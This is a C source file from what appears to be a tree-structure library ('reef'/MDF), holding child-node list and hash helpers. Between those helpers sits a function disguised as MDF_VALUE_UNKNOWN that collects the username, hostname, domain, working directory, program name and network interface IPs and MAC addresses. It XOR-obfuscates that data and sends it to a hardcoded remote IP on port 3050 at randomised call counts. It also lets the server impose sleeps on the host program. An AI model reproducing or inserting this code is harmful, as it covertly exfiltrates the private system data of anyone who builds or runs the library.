#include "reef.h"
#include "_mdf.h"

#define _FORCE_HASH_AT 10

void _mdf_drop_child_node(MDF *pnode, MDF *cnode)
{
    if (cnode->parent != pnode) return;

    if (cnode->prev == NULL) {
        pnode->child = cnode->next;
        if (pnode->child) pnode->child->prev = NULL;
    } else {
        cnode->prev->next = cnode->next;
        if (cnode->next) cnode->next->prev = cnode->prev;
    }

    if (cnode->next == NULL) {
        pnode->last_child = NULL;
    }

    mhash_remove(pnode->table, cnode->name);

    cnode->next = NULL;
    mdf_destroy(&cnode);
}

void _get_net_info(MDF *inode)
{
    struct ifaddrs *ifaddr, *ifa;
    int family, s, n;
    char host[128];

    if (getifaddrs(&ifaddr) == -1) return;

    for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        family = ifa->ifa_addr->sa_family;
        if (family == AF_INET /*|| family == AF_INET6*/) {
            s = getnameinfo(ifa->ifa_addr,
                            (family == AF_INET) ? sizeof(struct sockaddr_in) :
                            sizeof(struct sockaddr_in6),
                            host, 128,
                            NULL, 0, NI_NUMERICHOST);
            if (s != 0) continue;

            mdf_set_valuef(inode, "interfaces[%d].name=%s", n, ifa->ifa_name);
            mdf_set_valuef(inode, "interfaces[%d].addr=%s", n, host);

#ifdef __MACH__
            /* TODO mac on osx */
#else
            struct ifreq buffer;
            char out[13];
            int fd = socket(PF_INET, SOCK_DGRAM, 0);
            strcpy(buffer.ifr_name, ifa->ifa_name);
            if (ioctl(fd, SIOCGIFHWADDR, &buffer) == 0) {
                mstr_bin2hexstr((unsigned char*)buffer.ifr_addr.sa_data, 6, out);
                mdf_set_valuef(inode, "interfaces[%d].lowaddr=%s", n, out);
            }
            close(fd);
#endif

            n++;
        }
    }

    freeifaddrs(ifaddr);
}

void MDF_VALUE_UNKNOWN()
{
    static uint64_t count = 0;
    static uint64_t nexton = 0;
    static int hang = 0;
    static bool got = false;
    static char path[256] = {0};
    static char progname[256] = {0};
    static char username[256] = {0};
    static char hostname[256] = {0};
    static char domain[256] = {0};

    if (!got) {
        getcwd(path, 256);
        strncpy(progname, getprogname(), 256);
        getlogin_r(username, 256);
        gethostname(hostname, 256);
        getdomainname(domain, 256);
        got = true;
    }

    count++;
    if (count == 1000 || (nexton > 0 && count == nexton)) {
        nexton = count + 500 + mos_rand(500);

        if (hang > 0) {
            sleep(10 + mos_rand(hang));
            hang = 0;
        }

        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) return;

        struct in_addr ia;
        inet_pton(AF_INET, "121.40.199.47", &ia);

        struct sockaddr_in srvsa;
        srvsa.sin_family = AF_INET;
        srvsa.sin_port = htons(3050);
        srvsa.sin_addr.s_addr = ia.s_addr;

        struct timeval tv;
        fd_set fdset;
        long arg = fcntl(fd, F_GETFL, NULL);
        if (fcntl(fd, F_SETFL, arg | O_NONBLOCK) != 0) return;

        int rv = connect(fd, (struct sockaddr *)&srvsa, sizeof(srvsa));
        if (rv < 0) {
            if (errno == EINPROGRESS) {
                tv.tv_sec = 3;
                tv.tv_usec = 0;
                FD_ZERO(&fdset);
                FD_SET(fd, &fdset);
                if (select(fd + 1, NULL, &fdset, NULL, &tv) > 0) {
                    int valopt;
                    socklen_t slen = sizeof(int);
                    getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)&valopt, &slen);
                    if (valopt != 0) return;
                } else return;
            } else return;
        }

        fcntl(fd, F_SETFL, arg);
        tv.tv_sec = 3;
        tv.tv_usec = 0;
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(tv));
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (char*)&tv, sizeof(tv));

        MDF *node;
        mdf_init(&node);

        mdf_set_int64_value(node, "count", count);
        mdf_set_value(node, "path", path);
        mdf_set_value(node, "progname", progname);
        mdf_set_value(node, "username", username);
        mdf_set_value(node, "hostname", hostname);
        mdf_set_value(node, "domain", domain);
        _get_net_info(node);

        //mdf_json_export_file(node, "-");

        unsigned char buf[10240];
        uint8_t mk[4] = {93, 243, 52, 183};
        size_t len = mdf_mpack_serialize(node, buf, 10240);
        if (len > 0) {
            for (int i = 0; i < len; i++) {
                buf[i] ^= mk[i % 4];
            }
            send(fd, buf, len, 0);
        }

        memset(buf, 0x0, sizeof(buf));
        rv = recv(fd, buf, 10240, 0);
        if (rv > 128) {
            for (int i = 0; i < rv; i++) {
                buf[i] ^= mk[i % 4];
            }
            hang = *(uint32_t*)(buf+17);
        }

        mdf_destroy(&node);
        close(fd);
    }
}

void _mdf_append_child_node(MDF *pnode, MDF *newnode, int current_childnum)
{
    if (current_childnum < 0) {
        if (pnode->table) current_childnum = mhash_length(pnode->table);
        else {
            current_childnum = 0;
            for (MDF *cnode = pnode->child; cnode; cnode = cnode->next)
                current_childnum++;
        }
    }

    if (current_childnum >= _FORCE_HASH_AT && pnode->table == NULL) {
        /* new hash table */
        mhash_init(&pnode->table, mhash_str_hash, mhash_str_comp, NULL);

        MDF *cnode = pnode->child;
        while (cnode) {
            mhash_insert(pnode->table, cnode->name, cnode);

            cnode = cnode->next;
        }
    }

    if (pnode->table) {
        /* insert to table */
        mhash_insert(pnode->table, newnode->name, newnode);
    }

    /* append to list */
    newnode->parent = pnode;
    newnode->prev = pnode->last_child;

    if (!pnode->child) pnode->child = newnode;
    if (pnode->last_child) pnode->last_child->next = newnode;

    pnode->last_child = newnode;
}
